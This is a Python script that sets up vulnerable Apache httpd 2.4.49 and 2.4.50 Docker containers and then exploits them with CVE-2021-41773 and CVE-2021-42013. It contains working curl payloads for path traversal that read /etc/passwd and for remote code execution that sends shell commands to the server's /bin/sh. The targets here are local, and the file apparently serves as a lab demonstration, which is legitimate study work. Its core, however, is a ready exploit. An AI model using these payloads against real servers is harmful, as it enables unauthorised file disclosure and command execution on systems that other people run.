import subprocess
import shlex

HTTPD_2_4_49_Map_Files = 'HTTPD_2_4_49_Map_Files'
HTTPD_2_4_50_Map_Files = 'HTTPD_2_4_50_Map_Files'
HTTPD_2_4_49_RCE = 'HTTPD_2_4_49_RCE'
HTTPD_2_4_50_RCE = 'HTTPD_2_4_50_RCE'
IMAGE_VERSION = '1.1'
HTTPD_2_4_49_PORT_Map_Files = '80'
HTTPD_2_4_50_PORT_Map_Files = '88'
HTTPD_2_4_49_PORT_RCE = '8080'
HTTPD_2_4_50_PORT_RCE = '8888'
HTTPD_2_4_49_VERSION = '2.4.49'
HTTPD_2_4_50_VERSION = '2.4.50'
HTTPD_2_4_49_CVE_2021_41773_Map_Files = f'curl http://127.0.0.1:{HTTPD_2_4_49_PORT_Map_Files}/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd'
HTTPD_2_4_49_CVE_2021_42013_Map_Files = f'curl "http://127.0.0.1:{HTTPD_2_4_49_PORT_Map_Files}/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"'
HTTPD_2_4_50_CVE_2021_42013_Map_Files = f'curl "http://127.0.0.1:{HTTPD_2_4_50_PORT_Map_Files}/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"'
HTTPD_2_4_49_CVE_2021_41773_RCE_Write = f"curl -k -L -s --compressed 'http://127.0.0.1:{HTTPD_2_4_49_PORT_RCE}/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh' --data 'echo Content-type:text/plain; echo; echo “Successfully Exploited” > /tmp/exploited'"
HTTPD_2_4_49_CVE_2021_41773_RCE_Read = f"curl -k -L -s --compressed 'http://127.0.0.1:{HTTPD_2_4_49_PORT_RCE}/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh' --data 'echo Content-type:text/plain; echo; cat /tmp/exploited'"
HTTPD_2_4_49_CVE_2021_42013_RCE_Write = f"curl -k -L -s --compressed 'http://127.0.0.1:{HTTPD_2_4_49_PORT_RCE}/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-type:text/plain; echo; echo “Successfully Exploited” > /tmp/exploited'"
HTTPD_2_4_49_CVE_2021_42013_RCE_Read = f"curl -k -L -s --compressed 'http://127.0.0.1:{HTTPD_2_4_49_PORT_RCE}/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-type:text/plain; echo; cat /tmp/exploited'"
HTTPD_2_4_50_CVE_2021_42013_RCE_Write = f"curl -k -L -s --compressed 'http://127.0.0.1:{HTTPD_2_4_50_PORT_RCE}/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-type:text/plain; echo; echo “Successfully Exploited” > /tmp/exploited'"
HTTPD_2_4_50_CVE_2021_42013_RCE_Read = f"curl -k -L -s --compressed 'http://127.0.0.1:{HTTPD_2_4_50_PORT_RCE}/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-type:text/plain; echo; cat /tmp/exploited'"
CVE_2021_41773 = 'CVE-2021-41773'
CVE_2021_42013 = 'CVE-2021-42013'


def run_command(command):
    """This function run commands and returns the stdout."""
    shlex_command = shlex.split(command)
    command_output = subprocess.run(shlex_command, capture_output=True, text=True)
    return command_output.stdout


def create_container(tag, path, port):
    """This function performs the build and the creation of a container."""
    success = True
    print(f'[*] Building {tag} docker image')
    docker_build_command = f'docker build -t {tag} {path}'
    docker_build_output = run_command(docker_build_command)
    if 'docker: Error ' in docker_build_output:
        print('There is an error building the image')
        success = False
        return success
    container_name = tag.upper().split(':')[0]
    docker_run_command = f'docker run -dit --name {container_name} -p {port}:80 {tag}'
    docker_run_output = run_command(docker_run_command)
    print(f'[*] Running {container_name} docker container')
    if 'docker: Error ' in docker_run_output:
        print('There is an error running the container')
        success = False
    return success


def get_running_containers():
    """This function returns the running containers."""
    docker_ps_command = 'sudo docker ps -f status=running'
    docker_ps_output = run_command(docker_ps_command)
    if not docker_ps_output:
        print(f'Error - Could not find running containers')
        return False
    return docker_ps_output


def check_container(tag, name, port, version):
    """This function checks if a container name or port are existed."""
    running_containers = get_running_containers()
    if not running_containers:
        return running_containers
    container = tag.split(':')[0]
    print(f'\n[*] Creating the {container} container based on the HTTPD:{version} image')
    success = True
    for field in running_containers.split('\n')[1: -1]:
        running_container = field.split()
        container_name = running_container[-1]
        container_port = running_container[-2]
        if container_name == name and f'{port}->80' in container_port:
            print(f'[*] The {container_name} container already exists')
            return success
        elif container_name == name:
            print(f'Error - The {name} name is taken in another container')
            success = False
        elif f'{port}->80' in container_port:
            print(f'Error - The {container_name} port is taken in another container')
            success = False
    if success is True:
        return create_container(tag.lower(), name, port)
    else:
        return success


def print_exploit(version, cve, exploit_command):
    """This function prints the exploit messages"""
    print(f'[*] Exploit the container based on the HTTPD:{version} image with {cve}')
    print(f'[*] Command: {exploit_command}')
    print(run_command(exploit_command))


def exploits():
    """This function performs the exploits on the running containers."""
    print(f'[*] Exploit Path Traversal Map Files - Read /etc/passwd')
    print(f'[*] Running containers')
    print(f'\n{get_running_containers()}')
    print_exploit(HTTPD_2_4_49_VERSION, CVE_2021_41773, HTTPD_2_4_49_CVE_2021_41773_Map_Files)
    print_exploit(HTTPD_2_4_49_VERSION, CVE_2021_42013, HTTPD_2_4_49_CVE_2021_42013_Map_Files)
    print_exploit(HTTPD_2_4_50_VERSION, CVE_2021_42013, HTTPD_2_4_50_CVE_2021_42013_Map_Files)
    print(f'[*] Exploit Path Traversal RCE - Write "Successfully Exploited" to /tmp/exploited and print it')
    print_exploit(HTTPD_2_4_49_VERSION, CVE_2021_41773, HTTPD_2_4_49_CVE_2021_41773_RCE_Write)
    print_exploit(HTTPD_2_4_49_VERSION, CVE_2021_41773, HTTPD_2_4_49_CVE_2021_41773_RCE_Read)
    print_exploit(HTTPD_2_4_49_VERSION, CVE_2021_42013, HTTPD_2_4_49_CVE_2021_42013_RCE_Write)
    print_exploit(HTTPD_2_4_49_VERSION, CVE_2021_42013, HTTPD_2_4_49_CVE_2021_42013_RCE_Read)
    print_exploit(HTTPD_2_4_50_VERSION, CVE_2021_42013, HTTPD_2_4_50_CVE_2021_42013_RCE_Write)
    print_exploit(HTTPD_2_4_50_VERSION, CVE_2021_42013, HTTPD_2_4_50_CVE_2021_42013_RCE_Read)


def main():
    """This is the main function."""
    print('\n© Ofri Ouzan (B4MB1)')
    print('\n\n******************** STAGE 1 - Create Exploitable Environment ********************')
    first_image_tag = f'{HTTPD_2_4_50_Map_Files}:{IMAGE_VERSION}'
    second_image_tag = f'{HTTPD_2_4_49_Map_Files}:{IMAGE_VERSION}'
    third_image_tag = f'{HTTPD_2_4_50_RCE}:{IMAGE_VERSION}'
    fourth_image_tag = f'{HTTPD_2_4_49_RCE}:{IMAGE_VERSION}'
    if check_container(first_image_tag, HTTPD_2_4_50_Map_Files, HTTPD_2_4_50_PORT_Map_Files, HTTPD_2_4_50_VERSION) is True and \
            check_container(second_image_tag, HTTPD_2_4_49_Map_Files, HTTPD_2_4_49_PORT_Map_Files, HTTPD_2_4_49_VERSION) is True and \
            check_container(third_image_tag, HTTPD_2_4_50_RCE, HTTPD_2_4_50_PORT_RCE, HTTPD_2_4_50_VERSION) is True and \
            check_container(fourth_image_tag, HTTPD_2_4_49_RCE, HTTPD_2_4_49_PORT_RCE, HTTPD_2_4_49_VERSION) is True:
        print('\n\n***************************** STAGE 2 - Exploitation *****************************')
        exploits()


if __name__ == "__main__":
    main()
